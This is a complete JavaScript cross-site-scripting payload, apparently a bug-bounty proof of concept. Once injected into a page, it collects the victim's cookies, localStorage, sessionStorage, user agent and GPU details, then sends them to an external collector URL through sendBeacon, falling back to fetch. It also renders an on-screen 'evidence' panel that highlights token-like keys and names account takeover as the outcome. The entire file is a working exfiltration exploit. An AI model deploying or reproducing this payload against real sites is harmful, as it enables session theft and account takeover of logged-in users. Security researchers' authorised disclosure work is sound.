// WILD XSS — Raman_MG signature. Renders a self-documenting evidence panel (screenshot-ready)
// and exfiltrates the captured data to a persistent collector via sendBeacon (no CORS, clean console).
(() => {
  const COLLECTOR = "https://rmg-collector.ramanmgg1.workers.dev/"; // https://rmg-collector.<sub>.workers.dev/
  // ---- collect ----
  const cvs = document.createElement("canvas"),
    gl = cvs.getContext("webgl") || cvs.getContext("experimental-webgl"),
    dbg = gl && gl.getExtension("WEBGL_debug_renderer_info"),
    gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A",
    vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "N/A";
  const ls = { ...localStorage }, ss = { ...sessionStorage };
  const cookieList = document.cookie ? document.cookie.split(";").map(s => s.trim()).filter(Boolean) : [];
  const data = {
    origin: location.origin, host: location.host, path: location.pathname, url: location.href,
    cookies: document.cookie, userAgent: navigator.userAgent,
    localStorage: ls, sessionStorage: ss, historyLength: history.length, gpu, vendor,
    capturedAt: new Date().toISOString()
  };
  // ---- exfil (sendBeacon primary; fetch keepalive fallback) ----
  const payload = "msg=" + encodeURIComponent(JSON.stringify(data));
  let sent = false;
  try { sent = navigator.sendBeacon(COLLECTOR, new Blob([payload], { type: "application/x-www-form-urlencoded" })); } catch (e) {}
  if (!sent) { try { fetch(COLLECTOR, { method: "POST", mode: "cors", keepalive: true, headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: payload }); } catch (e) {} }

  // ---- self-documenting on-screen evidence panel (Shadow DOM: fully isolated from the page's hostile CSS) ----
  const clip = (v, n) => { v = String(v == null ? "" : v); return v.length > n ? v.slice(0, n) + "…" : v; };
  const enc = s => String(s == null ? "" : s).replace(/[&<>]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]));
  const HOT = /token|auth|session|jwt|secret|key|bearer|sid|sso|hammer|access|refresh|cred/i;
  const lsKeys = Object.keys(ls), ssKeys = Object.keys(ss);
  const kvTable = obj => { const ks = Object.keys(obj); return ks.length
    ? ks.slice(0, 16).map(k => "<tr><td class='k" + (HOT.test(k) ? " hot" : "") + "'>" + enc(clip(k, 34)) + "</td><td class='v'>" + enc(clip(obj[k], 90)) + "</td></tr>").join("") + (ks.length > 16 ? "<tr><td class='k'></td><td class='v'>…+" + (ks.length - 16) + " more</td></tr>" : "")
    : "<tr><td class='v' style='color:#456'>— none —</td></tr>"; };
  const ckTable = cookieList.length
    ? cookieList.slice(0, 16).map(c => { const k = c.split("=")[0]; return "<tr><td class='k" + (HOT.test(k) ? " hot" : "") + "'>" + enc(clip(k, 34)) + "</td><td class='v'>" + enc(clip(c.slice(k.length + 1), 90)) + "</td></tr>"; }).join("") + (cookieList.length > 16 ? "<tr><td class='k'></td><td class='v'>…+" + (cookieList.length - 16) + " more</td></tr>" : "")
    : "<tr><td class='v' style='color:#456'>— none —</td></tr>";

  const host = document.createElement("div");
  host.setAttribute("data-xss", "rmg");
  host.style.cssText = "position:absolute;top:20px;left:50%;transform:translateX(-50%);width:780px;max-width:95vw;z-index:2147483647;";
  const root = host.attachShadow({ mode: "open" });
  root.innerHTML =
    "<style>:host{all:initial}*{box-sizing:border-box;font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:13px;line-height:1.5}"
    + ".card{background:linear-gradient(180deg,#04120a,#020a06);color:#8affc0;border:1px solid #0f6;border-radius:12px;box-shadow:0 0 40px #0f65,0 0 4px #0f6 inset;overflow:hidden}"
    + ".head{background:#0f6;color:#02170d;font-weight:700;letter-spacing:.5px;padding:11px 16px;display:flex;justify-content:space-between;align-items:center}"
    + ".sub{padding:6px 16px 0;color:#4fbf85;font-size:11px}"
    + "table{border-collapse:collapse;width:100%;margin:6px 0}"
    + "td{padding:2px 0;vertical-align:top}td.k{color:#5fb98a;padding:2px 14px;white-space:nowrap;width:170px;word-break:break-all}td.v{color:#cfeede;padding-right:16px;word-break:break-all}td.v.hi{color:#eaffea}"
    + "tr:has(.hot) td{background:#1c0f04}td.k.hot{color:#ffb35c}"
    + ".sec{color:#02170d;background:#0f6a;font-weight:700;margin:10px 0 0;padding:5px 16px;letter-spacing:1px}"
    + ".sec em{float:right;font-style:normal;opacity:.8}"
    + ".foot{color:#8fd3aa;font-size:11px;padding:12px 16px 14px;border-top:1px dashed #0f63;margin-top:8px}.foot b{color:#ffcf99}</style>"
    + "<div class='card'>"
    + "<div class='head'><span>⚡ XSS EXECUTED &nbsp;·&nbsp; by Raman_MG</span><span>" + (sent ? "◉ EXFILTRATED" : "◉ EXFIL (fetch)") + "</span></div>"
    + "<table>"
    + "<tr><td class='k'>ORIGIN</td><td class='v hi'>" + enc(data.origin) + "</td></tr>"
    + "<tr><td class='k'>HOST</td><td class='v hi'>" + enc(data.host) + "</td></tr>"
    + "<tr><td class='k'>PATH</td><td class='v'>" + enc(data.path) + "</td></tr>"
    + "<tr><td class='k'>USER-AGENT</td><td class='v'>" + enc(clip(data.userAgent, 110)) + "</td></tr>"
    + "<tr><td class='k'>GPU</td><td class='v'>" + enc(clip(gpu + " · " + vendor, 110)) + "</td></tr>"
    + "<tr><td class='k'>HISTORY</td><td class='v'>" + data.historyLength + " entries</td></tr>"
    + "<tr><td class='k'>CAPTURED</td><td class='v'>" + enc(data.capturedAt) + "</td></tr>"
    + "</table>"
    + "<div class='sec'>COOKIES <em>" + cookieList.length + "</em></div><table>" + ckTable + "</table>"
    + "<div class='sec'>LOCALSTORAGE <em>" + lsKeys.length + " keys</em></div><table>" + kvTable(ls) + "</table>"
    + "<div class='sec'>SESSIONSTORAGE <em>" + ssKeys.length + " keys</em></div><table>" + kvTable(ss) + "</table>"
    + "<div class='foot'>▸ Every value above was read by attacker-controlled JavaScript running in the <b>" + enc(data.host) + "</b> origin and exfiltrated to an external server. On a logged-in victim, session tokens in these stores are stolen → <b>account takeover</b>.</div>"
    + "</div>";
  const paint = () => (document.body || document.documentElement).appendChild(host);
  document.body ? paint() : addEventListener("DOMContentLoaded", paint);
})();
